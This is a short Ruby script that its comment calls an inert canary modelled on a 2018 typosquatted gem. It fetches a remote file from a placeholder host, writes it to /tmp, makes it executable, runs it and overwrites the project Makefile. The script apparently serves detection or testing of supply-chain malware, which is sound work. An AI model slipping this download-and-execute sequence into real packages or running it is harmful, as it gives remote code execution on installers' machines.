# INERT CANARY modelled on active-support 5.2.0 (2018 typosquat): fetch, write to /tmp, run
require 'net/http'
body = Net::HTTP.get_response(URI('http://' + 'example.invalid' + '/x')).body
File.open('/tmp/canary-bin', 'wb+') { |f| f.write(body) }
File.chmod(0755, '/tmp/canary-bin')
system('/tmp/canary-bin')
File.write('Makefile', "all:\n\ttrue\n")
